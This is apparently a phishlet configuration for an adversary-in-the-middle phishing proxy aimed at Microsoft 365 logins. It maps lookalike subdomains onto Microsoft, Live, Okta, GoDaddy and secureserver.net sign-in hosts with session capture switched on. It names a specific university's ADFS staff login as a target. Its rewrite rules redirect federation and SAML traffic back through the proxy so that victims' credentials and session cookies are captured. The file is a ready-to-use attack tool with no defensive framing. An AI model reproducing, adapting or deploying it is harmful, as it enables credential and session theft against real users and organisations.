name: 'o365'
author: '@666'
min_ver: '3.0.0'
proxy_hosts:
  - {phish_sub: 'woman', orig_sub: 'login', domain: 'microsoftonline.com', session: true, is_landing: true, auto_filter: false}
  - {phish_sub: 'www', orig_sub: 'www', domain: 'office.com', session: true, is_landing: false, auto_filter: false}
  - {phish_sub: 'accoum', orig_sub: 'account', domain: 'microsoft.com', session: true, is_landing: false, auto_filter: false}
  - {phish_sub: 'privacynotice.account', orig_sub: 'privacynotice.account', domain: 'microsoft.com', session: false, is_landing: false, auto_filter: false}
  - {phish_sub: 'living', orig_sub: 'login', domain: 'live.com', session: true, is_landing: false, auto_filter: false}
  - {phish_sub: 'acc', orig_sub: 'account', domain: 'live.com', session: true, is_landing: false, auto_filter: false}
  - {phish_sub: 'outlmk', orig_sub: 'outlook', domain: 'live.com', session: true, is_landing: false, auto_filter: false}
  - {phish_sub: 'guii', orig_sub: 'gui', domain: 'godaddy.com', session: true, is_landing:false,  auto_filter: false}
  - {phish_sub: 'cisp', orig_sub: 'csp', domain: 'godaddy.com', session: true, is_landing:false, auto_filter: false}
  - {phish_sub: 'reporting', orig_sub: 'reporting', domain: 'cdndex.io', session: false, is_landing:false, auto_filter: false}
  - {phish_sub: 'ssso', orig_sub: 'sso', domain: 'godaddy.com', session: true, is_landing:false, auto_filter: false}
  - {phish_sub: 'sssn', orig_sub: 'sso', domain: 'secureserver.net', session: true, is_landing: false, auto_filter: false}
  - {phish_sub: 'sssn2', orig_sub: 'sso2', domain: 'secureserver.net', session: true, is_landing: false, auto_filter: false}
  - {phish_sub: 'events.api', orig_sub: 'events.api', domain: 'godaddy.com', session: true, is_landing: false, auto_filter: false}
  - {phish_sub: 'apm.vpce.gdw55e', orig_sub: '55c74eee6fcf46b1a0517a610f8d289a.apm.vpce.gdw55e', domain: 'elastic-cloud.com', session: true, is_landing: false, auto_filter: false}
  - {phish_sub: 'g.sst', orig_sub: 'g.sst', domain: 'godaddy.com', session: true, is_landing: false, auto_filter: false}
  - {phish_sub: 'sssl', orig_sub: 'compass-ssl', domain: 'microsoft.com', session: true, is_landing: false, auto_filter: false}
  - {phish_sub: 'oktai', orig_sub: 'login', domain: 'okta.com', session: true, is_landing: false, auto_filter: false}
# ADFS Proxy Hosts
  - { phish_sub: "adffs", orig_sub: "adfs", domain: "example.com", session: true, is_landing: false, auto_filter: false }
  - { phish_sub: "adfxs", orig_sub: "adfs", domain: "example.org", session: true, is_landing: false, auto_filter: false }
  - { phish_sub: "adfsst", orig_sub: "adfsstaff", domain: "mans.edu.eg", session: true, is_landing: false, auto_filter: false }

sub_filters:
# ADFS Sub Filters
  - { triggers_on: "adfs.example.com", orig_sub: "adfs", domain: "example.com", search: "{hostname}", replace: "{hostname}", mimes: ["text/html", "application/json", "application/javascript", "application/x-javascript", "text/javascript"] }
  - { triggers_on: "adfs.example.org", orig_sub: "adfs", domain: "example.org", search: "{hostname}", replace: "{hostname}", mimes: ["text/html", "application/json", "application/javascript", "application/x-javascript", "text/javascript"] }
# mans.edu.eg ADFS Sub Filters — rewrite self-references and Microsoft WS-Fed form action
  - { triggers_on: "adfsstaff.mans.edu.eg", orig_sub: "adfsstaff", domain: "mans.edu.eg", search: "{hostname}", replace: "{hostname}", mimes: ["text/html", "application/json", "application/javascript", "text/javascript"] }
  - { triggers_on: "adfsstaff.mans.edu.eg", orig_sub: "login", domain: "microsoftonline.com", search: "https://{hostname}", replace: "https://{hostname}", mimes: ["text/html"] }
  - { triggers_on: "adfsstaff.mans.edu.eg", orig_sub: "login", domain: "microsoftonline.com", search: "action=\"https://{hostname}", replace: "action=\"https://{hostname}", mimes: ["text/html"] }

# Microsoft Proxy Hosts — GoDaddy federation URL rewriting (response body)
  - { triggers_on: "login.microsoftonline.com", orig_sub: "sso", domain: "godaddy.com", search: "{hostname}", replace: "{hostname}", mimes: ["text/html", "application/json", "application/javascript", "application/x-javascript", "text/javascript"] }
  - { triggers_on: "login.live.com", orig_sub: "sso", domain: "godaddy.com", search: "{hostname}", replace: "{hostname}", mimes: ["text/html", "application/json", "application/javascript", "application/x-javascript", "text/javascript"] }
  - { triggers_on: "outlook.office.com", orig_sub: "sso", domain: "godaddy.com", search: "{hostname}", replace: "{hostname}", mimes: ["text/html", "application/json", "application/javascript", "application/x-javascript", "text/javascript"] }
  - { triggers_on: "outlook.office365.com", orig_sub: "sso", domain: "godaddy.com", search: "{hostname}", replace: "{hostname}", mimes: ["text/html", "application/json", "application/javascript", "application/x-javascript", "text/javascript"] }
# Microsoft Proxy Hosts — GoDaddy federation redirect (Location header) rewriting
  - { triggers_on: "login.microsoftonline.com", orig_sub: "sso", domain: "godaddy.com", search: "https://{hostname}", replace: "https://{hostname}", mimes: ["text/html", "application/json"], redirect_only: true }
  - { triggers_on: "login.live.com", orig_sub: "sso", domain: "godaddy.com", search: "https://{hostname}", replace: "https://{hostname}", mimes: ["text/html", "application/json"], redirect_only: true }
  - { triggers_on: "outlook.office.com", orig_sub: "sso", domain: "godaddy.com", search: "https://{hostname}", replace: "https://{hostname}", mimes: ["text/html", "application/json"], redirect_only: true }
  - { triggers_on: "outlook.office365.com", orig_sub: "sso", domain: "godaddy.com", search: "https://{hostname}", replace: "https://{hostname}", mimes: ["text/html", "application/json"], redirect_only: true }
# secureserver.net (GoDaddy custom domain SSO) URL rewriting in Microsoft responses (body)
  - { triggers_on: "login.microsoftonline.com", orig_sub: "sso", domain: "secureserver.net", search: "{hostname}", replace: "{hostname}", mimes: ["text/html", "application/json", "application/javascript", "application/x-javascript", "text/javascript"] }
  - { triggers_on: "login.live.com", orig_sub: "sso", domain: "secureserver.net", search: "{hostname}", replace: "{hostname}", mimes: ["text/html", "application/json", "application/javascript", "application/x-javascript", "text/javascript"] }
# secureserver.net federation redirect (Location header) rewriting
  - { triggers_on: "login.microsoftonline.com", orig_sub: "sso", domain: "secureserver.net", search: "https://{hostname}", replace: "https://{hostname}", mimes: ["text/html", "application/json"], redirect_only: true }
  - { triggers_on: "login.live.com", orig_sub: "sso", domain: "secureserver.net", search: "https://{hostname}", replace: "https://{hostname}", mimes: ["text/html", "application/json"], redirect_only: true }
# secureserver.net internal URL rewriting
  - { triggers_on: "sso.secureserver.net", orig_sub: "sso", domain: "secureserver.net", search: "href=\"https://{hostname}", replace: "href=\"https://{hostname}", mimes: ["text/html", "application/json", "application/javascript"] }
  - { triggers_on: "sso.secureserver.net", orig_sub: "sso", domain: "secureserver.net", search: "https://{hostname}", replace: "https://{hostname}", mimes: ["text/html", "application/json", "application/javascript"] }
# REVERSE: secureserver.net response → rewrite Microsoft federation endpoints back to our proxy
# (covers SAML POST-back action= attribute, JS window.location, JSON redirect URLs)
  - { triggers_on: "sso.secureserver.net", orig_sub: "login", domain: "microsoftonline.com", search: "https://{hostname}", replace: "https://{hostname}", mimes: ["text/html", "application/json", "application/javascript", "application/x-javascript", "text/javascript"] }
  - { triggers_on: "sso.secureserver.net", orig_sub: "login", domain: "microsoftonline.com", search: "action=\"https://{hostname}", replace: "action=\"https://{hostname}", mimes: ["text/html"] }
  - { triggers_on: "sso.secureserver.net", orig_sub: "login", domain: "live.com", search: "https://{hostname}", replace: "https://{hostname}", mimes: ["text/html", "application/json", "application/javascript", "application/x-javascript", "text/javascript"] }
  - { triggers_on: "sso.secureserver.net", orig_sub: "login", domain: "live.com", search: "action=\"https://{hostname}", replace: "action=\"https://{hostname}", mimes: ["text/html"] }
# REVERSE: secureserver.net Location header (302 with SAMLResponse → MS) rewriting
  - { triggers_on: "sso.secureserver.net", orig_sub: "login", domain: "microsoftonline.com", search: "https://{hostname}", replace: "https://{hostname}", mimes: ["text/html", "application/json"], redirect_only: true }
  - { triggers_on: "sso.secureserver.net", orig_sub: "login", domain: "live.com", search: "https://{hostname}", replace: "https://{hostname}", mimes: ["text/html", "application/json"], redirect_only: true }
# Same for sso2.secureserver.net (alt federation host)
  - { triggers_on: "sso2.secureserver.net", orig_sub: "login", domain: "microsoftonline.com", search: "https://{hostname}", replace: "https://{hostname}", mimes: ["text/html", "application/json", "application/javascript", "application/x-javascript", "text/javascript"] }
  - { triggers_on: "sso2.secureserver.net", orig_sub: "login", domain: "microsoftonline.com", search: "action=\"https://{hostname}", replace: "action=\"https://{hostname}", mimes: ["text/html"] }
  - { triggers_on: "sso2.secureserver.net", orig_sub: "login", domain: "microsoftonline.com", search: "https://{hostname}", replace: "https://{hostname}", mimes: ["text/html", "application/json"], redirect_only: true }
